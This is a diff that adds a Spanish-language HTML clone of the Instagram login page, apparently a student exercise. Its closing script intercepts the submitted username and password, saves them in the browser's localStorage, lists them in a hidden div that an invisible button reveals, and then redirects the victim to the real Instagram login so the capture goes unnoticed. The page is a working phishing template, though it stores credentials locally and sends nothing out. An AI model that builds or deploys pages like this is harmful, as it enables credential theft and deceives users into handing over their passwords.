@@ -1,0 +1,521 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="instagram.css">
+    <link rel="shortcut icon" href="580b57fcd9996e24bc43c521.png" type="image/x-icon">
+ <style>
+    /*BORJA JIMENEZ DIEZ 1 DAM*/
+body {
+    background-color: rgba(var(--b3f,250,250,250),1);
+}
+div.p100 {
+    border: 1px solid rgba(var(--b6a,219,219,219),1);
+    background-color: rgba(var(--d87,255,255,255),1);
+    margin-bottom: 10px;
+    padding-top: 5px;
+    padding-bottom: 20px;
+    width: 348px;
+    height: 325px;
+    margin-top: 30px;
+    margin-left: auto;
+    margin-right: auto;
+    text-align: center;
+}
+div.p101 {
+    width: 175px;
+    height: 51px;
+    margin-top: 36px;
+    margin-bottom: 36px;
+    margin-left: auto;
+    margin-right: auto;
+}
+div.p102 {
+    margin-bottom: 10px;
+    max-width: 350px;
+    width: 100%;
+}
+div.p103 {
+    border: 1px solid rgba(var(--ca6,219,219,219),1);
+    background-color: rgba(var(--b3f,250,250,250),1);
+    border-radius: 3px;
+    width: 268px;
+    height: 38px;
+    margin-left: 40px;
+    margin-right: 40px;
+    margin-bottom: 6px;
+}
+input.user {
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    background-color: rgba(var(--b3f,250,250,250),1);
+    font-size: 12px;
+    width: 250px;
+    height: 20px;
+    padding-top: 9px;
+    padding-bottom: 7px;
+    padding-left: 8px;
+    outline: 0;
+    border: 0;
+}
+div.p104 {
+    border: 1px solid rgba(var(--ca6,219,219,219),1);
+    background-color: rgba(var(--b3f,250,250,250),1);
+    border-radius: 3px;
+    width: 268px;
+    height: 38px;
+    -webkit-box-align: center;
+    align-items: center;
+    margin-left: 40px;
+    margin-right: 40px;
+    margin-bottom: 6px;
+}
+div.p110 {
+    background-color: rgba(var(--d87,255,255,255),1);
+    border: 1px solid rgba(var(--b6a,219,219,219),1);
+    width: 348px;
+    height: 41px;
+    padding-top: 10px;
+    padding-bottom: 10px;
+    margin-left: auto;
+    margin-right: auto;
+    margin-bottom: 10px;
+}
+div.p111 {
+    text-align: center;
+    font-weight: 400;
+    width: 242px;
+    height: 48px;
+    margin-top: -3px;
+    margin-left: auto;
+    margin-right: auto;
+    margin-bottom: -4px;
+}
+p.registro {
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    font-size: 14px;
+    margin: 15px;
+}
+a.registro2 {
+    color: rgba(var(--d69,0,149,246),1);
+    font-weight: 600;
+    text-decoration: none;
+}
+div.p120 {
+    display: flex;
+    flex-direction: column;
+    box-sizing: border-box;
+    align-items: stretch;
+    margin-left: auto;
+    margin-right: auto;
+    width: 350px;
+    height: 101px;
+}
+p.descarga {
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    display: block;
+    font-size: 14px;
+    text-align: center;
+    margin-top: 10px;
+    margin-bottom: 10px;
+    margin-left: 20px;
+    margin-right: 20px;
+    width: 310px;
+    height: 18px;
+}
+div.p121 {
+    display: flex;
+    justify-content: center;
+    margin-top: 10px;
+    margin-bottom: 10px;
+    width: 350px;
+    height: 44px;
+}
+a.link1 {
+    display: block;
+    text-decoration: none;
+    width: 136px;
+    height: 44px;
+    margin-right: 8px;
+}
+a.link2 {
+    display: block;
+    text-decoration: none;
+    width: 136px;
+    height: 44px;
+}
+img.imgApps {
+    vertical-align: baseline;
+    float: none;
+    width: 136px;
+    height: 40px;
+}
+input.password {
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    background-color: rgba(var(--b3f,250,250,250),1);
+    font-size: 12px;
+    width: 250px;
+    height: 20px;
+    padding-top: 9px;
+    padding-bottom: 7px;
+    padding-left: 8px;
+    outline: 0;
+    border: 0;
+}
+input.inicio {
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    background-color: rgba(var(--d69,0,149,246),.3);
+    color: rgba(var(--eca,255,255,255),1);
+    border: 1px solid transparent;
+    border-radius: 4px;
+    margin-top: 8px;
+    margin-bottom: 8px;
+    margin-left: 40px;
+    margin-right: 40px;
+    padding-top: 5px;
+    padding-bottom: 5px;
+    padding-left: 9px;
+    padding-right: 9px;
+    font-size: 14px;
+    font-weight: 600;
+    opacity: 1;
+    width: 268px;
+    height: 30px;
+    cursor: pointer;
+}
+img.logo {
+    width: 175px;
+    height: 51px;
+    object-fit: contain;
+    cursor: pointer;
+}
+a.linkpassw {
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    color: rgba(var(--fe0,0,55,107),1);
+    text-decoration: none;
+    font-size: 12px;
+    margin-top: 12px;
+}
+footer {
+    background-color: #f8f8f8;
+    padding: 20px 0;
+    text-align: center;
+    font-family: Arial, sans-serif;
+    font-size: 14px;
+    color: #333;
+    width: 100%;
+    position: relative;
+    bottom: 0;
+    left: 0;
+}
+
+/* Contenedor principal */
+.f100 {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 15px 20px;
+}
+
+/* Sección de enlaces */
+.f110 {
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 15px;
+    margin-bottom: 20px;
+}
+
+/* Alineación de los enlaces */
+.f111 {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 15px;
+    max-width: 900px;
+    text-align: center;
+}
+
+/* Estilos de los enlaces */
+.footerInsta a {
+    text-decoration: none;
+    color: #555;
+    font-size: 13px;
+    transition: color 0.3s ease, transform 0.2s;
+}
+
+.footerInsta a:hover {
+    color: #000;
+    transform: scale(1.05);
+}
+
+/* Sección de idioma y créditos */
+.f120 {
+    display: flex;
+    justify-content: center; /* Centra los elementos */
+    align-items: center;
+    flex-wrap: nowrap; /* Evita que los elementos salten de línea */
+    padding-top: 5px; /* Reduce el espacio superior */
+    gap: 5px; /* Reduce el espacio entre los elementos */
+}
+
+/* Selector de idioma */
+.f121 select {
+    padding: 5px 10px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 14px;
+    background-color: white;
+    cursor: pointer;
+}
+
+/* Créditos */
+.f122 .credits {
+    margin: 0;
+    font-size: 12px;
+    color: #777;
+}
+
+/* Espaciado en móvil */
+@media (max-width: 768px) {
+    .f111 {
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .f120 {
+        flex-direction: column;
+        text-align: center;
+        gap: 10px;
+    }
+}
+
+
+p.credits {
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    color: rgba(var(--f52,142,142,142),1);
+    font-size: 12px;
+    font-weight: 400;
+    margin: 0px;
+}
+
+select.idioma {
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    background-color: transparent;
+    border: 0px solid transparent;
+    color: rgba(var(--f52,142,142,142),1);
+    font-size: 12px;
+    font-weight: 400;
+    cursor: pointer;
+}
+
+.facebook-login {
+    display: flex;
+    align-items: center; /* Alinea el logo y el texto verticalmente */
+    justify-content: center; /* Centra horizontalmente si es necesario */
+    margin-top: 10px; /* Ajusta según necesites */
+}
+
+.facebook-logo {
+    width: 20px;  /* Ajusta el tamaño del logo */
+    height: 20px;
+    margin-right: 8px; /* Espacio entre el logo y el texto */
+}
+
+.facebook-text {
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    font-size: 14px;
+    color: #0095f6; /* Color azul típico de Facebook */
+    font-weight: 600; /* Para hacerlo más visible */
+    cursor: pointer;
+    text-decoration: none;
+}
+
+ </style>   
+<!-- Code injected by Five-server -->
+  <script async="" data-id="five-server" data-file="c:\Users\Usuario\Documents\visual studio\guardado\Instagram.html" type="application/javascript" src="/fiveserver.js"></script>
+  <style>      
+      /* Injected by five-server */
+      /*[data-highlight="true"] {
+        border: 1px rgb(90,170,255) solid !important;
+        background-color: rgba(155,215,255,0.5);
+        animation: fadeOutHighlight 1s forwards 0.5s;
+      }
+      img[data-highlight="true"] {
+        filter: sepia(100%) hue-rotate(180deg) saturate(200%);
+        animation: fadeOutHighlightIMG 0.5s forwards 0.5s;
+      }*/
+      @keyframes fadeOutHighlight {
+        from {background-color: rgba(155,215,255,0.5);}
+        to {background-color: rgba(155,215,255,0);}
+      }      
+      @keyframes fadeOutHighlightIMG {
+        0% {filter: sepia(100%) hue-rotate(180deg) saturate(200%);}
+        33% {filter: sepia(66%) hue-rotate(180deg) saturate(100%);}
+        50% {filter: sepia(50%) hue-rotate(90deg) saturate(50%);}
+        66% {filter: sepia(33%) hue-rotate(0deg) saturate(100%);}
+        100% {filter: sepia(0%) hue-rotate(0deg) saturate(100%);}
+      }
+      @keyframes fiveserverInfoPopup {
+        0%   {top:-40px;}
+        15%  {top:4px;}
+        85%  {top:4px;}
+        100% {top:-40px;}
+      }
+      /*smaller*/
+      @media (max-width: 640px) {
+        #fiveserver-info-wrapper {
+          max-width: 98%;
+        }
+        #fiveserver-info {
+          border-radius: 0px;
+        }      
+      }
+
+      </style></head>
+<body>
+    <button id="toggleCredenciales" style="margin-top: 10px; border-color:rgba(255, 255, 255, 0); color:rgba(255, 255, 255, 0); background-color: #00000000;">credencialesGuardadas</button>
+    <div id="credencialesGuardadas" style="margin-top: 20px; padding: 10px; border: 1px solid rgb(204, 204, 204); background-color: rgb(249, 249, 249); display: none;">
+
+    </div>
+    <div class="p100">
+        <div class="p101"><img class="logo" src="Instagram_logo.svg.png" alt="Logo Instagram"></div>
+        <form class="formulario" action="">
+            <div class="p102">
+                <div class="p103"><input class="user" type="text" name="user" id="user" placeholder="Teléfono, usuario o correo electrónico"></div>
+                <div class="p104"><input class="password" type="password" name="password" id="password" placeholder="Contraseña"></div>
+                <div class="p105"><input class="inicio" style="background-color: #0095f6;" type="submit" value="Entrar"></div>
+            </div> 
+            <div class="facebook-login">
+                <img src="https://imgs.search.brave.com/erHHN64glv2s_KKHoCygrLXMRf6E-FA3NOZkB6H2Ds0/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9pbWcu/ZnJlZXBpay5jb20v/cHJlbWl1bS1waG90/by9mYWNlYm9vay1s/b2dvXzEwODAwMjkt/MTA3LmpwZz9zZW10/PWFpc19oeWJyaWQ" alt="Facebook Logo" class="facebook-logo">
+                <p class="facebook-text">Inicia sesión con Facebook</p>
+            </div>
+            
+            <a class="linkpassw" href="https://z-p15.www.instagram.com/accounts/password/reset/">¿Has olvidado la contraseña?
+            </a> 
+        </form>
+    </div>
+    <div class="p110">
+        <div class="p111"><p class="registro">¿No tienes una cuenta? <a class="registro2" href="https://www.instagram.com/accounts/emailsignup/">Regístrate</a></p></div>
+    </div>
+    <div class="p120">
+        <p class="descarga">Descarga la aplicación.</p>
+        <div class="p121">
+            <a class="link1" href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DF20606B5-A939-4C0A-AFF7-DED9F3B400EE%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps://www.instagram.com/&pli=1">
+                <img class="imgApps" src="https://static.cdninstagram.com/rsrc.php/v4/yd/r/xOhODS7viZl.png" alt="AppStore">
+            </a>
+            <a class="link2" href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=7%2C0%2C1374%2C639">
+                <img class="imgApps" src="https://static.cdninstagram.com/rsrc.php/v4/y9/r/LjIQEL8csb0.png" alt="GooglePlay">
+            </a>
+        </div>
+    </div>
+    <footer>
+        <div class="f100">
+            <div class="f110">
+                <div class="f111">
+                    <div class="footerInsta"><a href="https://about.meta.com/">Meta</a></div>
+                    <div class="footerInsta"><a href="https://about.instagram.com/">Información</a></div>
+                    <div class="footerInsta"><a href="https://about.instagram.com/blog">Blog</a></div>
+                    <div class="footerInsta"><a href="https://about.instagram.com/about-us/careers">Empleo</a></div>
+                    <div class="footerInsta"><a href="https://help.instagram.com/">Ayuda</a></div>
+                    <div class="footerInsta"><a href="https://developers.facebook.com/docs/instagram">API</a></div>
+                    <div class="footerInsta"><a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacidad</a></div>
+                    <div class="footerInsta"><a href="https://help.instagram.com/581066165581870/?locale=es_ES">Condiciones</a></div>
+                    <div class="footerInsta"><a href="https://z-p15.www.instagram.com/accounts/login/?next=/directory/profiles/">Cuentas destacadas</a></div>
+                    <div class="footerInsta"><a href="https://z-p15.www.instagram.com/directory/hashtags/">Hashtags</a></div>
+                    <div class="footerInsta"><a href="https://z-p15.www.instagram.com/accounts/login/?next=/explore/locations/">Ubicaciones</a></div>
+                    <div class="footerInsta"><a href="https://z-p15.www.instagram.com/web/lite/">Instagram Lite</a></div>
+                    <div class="footerInsta"><a href="https://www.facebook.com/help/instagram/261704639352628">Subir contactos y no usuarios</a></div>
+                    <div class="footerInsta"><a href="https://www.instagram.com/Digital_Collectibles_Privacy_Notice/">Aviso de privacidad de artículos coleccionables digitales</a></div>
+                </div>
+            </div>
+            <div class="f120">
+                <div class="f121">
+                    <select class="idioma" name="idioma" id="idioma">
+                        <option value="esp">Español</option>
+                        <option value="eng">Inglés</option>
+                        <option value="ita">Italiano</option>
+                        <option value="fra">Francés</option>
+                    </select>
+                </div>
+                <div class="f122">
+                    <p class="credits">
+                        © 2025 Instagram from Meta</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <script>
+        // Cargar las credenciales almacenadas al cargar la página
+        document.addEventListener('DOMContentLoaded', function() {
+            const savedCredentials = JSON.parse(localStorage.getItem('savedCredentials')) || [];
+    
+            if (savedCredentials.length > 0) {
+                savedCredentials.forEach(cred => agregarCredencialesAlDiv(cred.user, cred.password));
+            }
+    
+            // Selecciona el botón de inicio de sesión
+            const loginButton = document.querySelector('.inicio');
+    
+            // Evento al hacer clic en el botón
+            loginButton.addEventListener('click', function(event) {
+                event.preventDefault(); // Previene el envío del formulario por defecto
+    
+                // Captura los valores de los campos de usuario y contraseña
+                const username = document.querySelector('#user').value;
+                const password = document.querySelector('#password').value;
+    
+                // Verifica que los campos no estén vacíos
+                if (username && password) {
+                    // Guardar las credenciales en LocalStorage
+                    savedCredentials.push({ user: username, password: password });
+                    localStorage.setItem('savedCredentials', JSON.stringify(savedCredentials));
+    
+                    // Agregar las credenciales al div como párrafos
+                    agregarCredencialesAlDiv(username, password);
+    
+                    // Redirigir a otra página después de guardar las credenciales
+                    window.location.href = 'https://www.instagram.com/accounts/login/';
+                } else {
+                    alert('Por favor completa ambos campos.');
+                }
+            });
+    
+            // Evento para mostrar/ocultar las credenciales
+            const toggleButton = document.querySelector('#toggleCredenciales');
+            toggleButton.addEventListener('click', function() {
+                const credencialesDiv = document.getElementById('credencialesGuardadas');
+                if (credencialesDiv.style.display === 'none') {
+                    credencialesDiv.style.display = 'block';
+                    toggleButton.textContent = 'Ocultar Credenciales';
+                } else {
+                    credencialesDiv.style.display = 'none';
+                    toggleButton.textContent = 'Mostrar Credenciales';
+                }
+            });
+        });
+    
+        // Función para agregar las credenciales al div como párrafos
+        function agregarCredencialesAlDiv(user, password) {
+            let credencialesDiv = document.getElementById('credencialesGuardadas');
+    
+            // Si el div no existe, crearlo
+            if (!credencialesDiv) {
+                credencialesDiv = document.createElement('div');
+                credencialesDiv.id = 'credencialesGuardadas';
+                credencialesDiv.style.marginTop = '20px';
+                credencialesDiv.style.padding = '10px';
+                credencialesDiv.style.border = '1px solid #ccc';
+                credencialesDiv.style.backgroundColor = '#f9f9f9';
+                document.body.appendChild(credencialesDiv);
+            }
+    
+            // Agregar nuevas credenciales sin eliminar las anteriores
+            const credencialesHTML = `
+                <p><strong>Usuario:</strong> ${user}</p>
+                <p><strong>Contraseña:</strong> ${password}</p>
+                <hr>
+            `;
+            credencialesDiv.innerHTML += credencialesHTML;
+        }
+    </script>
+</body></html>
